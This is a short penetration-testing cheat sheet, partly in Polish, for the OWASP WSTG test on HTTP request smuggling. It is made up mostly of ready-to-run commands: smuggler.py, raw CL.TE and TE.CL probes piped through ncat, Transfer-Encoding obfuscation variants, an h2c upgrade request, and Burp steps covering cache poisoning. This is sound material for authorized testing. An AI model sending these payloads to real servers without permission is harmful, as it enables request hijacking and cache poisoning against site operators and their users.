# WSTG-INPV-16 — Testing for HTTP Request Smuggling

## Cele

- Identify request boundary inconsistencies between frontend and backend
- Detect classic CL/TE desynchronization vulnerabilities

## KOMENDY

### smuggler.py

```bash
python3 smuggler.py -u "https://TARGET/"

```

### Reczne testowanie CL.TE

```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | ncat TARGET 443 --ssl

```

### Reczne testowanie TE.CL

```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nG\r\n0\r\n\r\n' | ncat TARGET 443 --ssl

```

### Testowanie TE.TE (obfuskacja)

```bash
# Transfer-Encoding: chunked
# Transfer-Encoding: xchunked
# Transfer-Encoding : chunked
# Transfer-Encoding: chunked\r\nTransfer-Encoding: x

```

### h2c smuggling

```bash
curl --http2 -X PRI "https://TARGET/" -H "Upgrade: h2c"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Request Smuggling

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Request Smuggling/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Uzyj Burp HTTP Request Smuggler extension
2. Testuj CL.TE, TE.CL i TE.TE warianty
3. Monitoruj odpowiedzi pod katem desynchronizacji
4. Testuj HTTP/2 downgrade attacks
5. Sprawdz czy mozna zatruć cache przez smuggling
6. Uzyj Burp Turbo Intruder do zaawansowanych testow

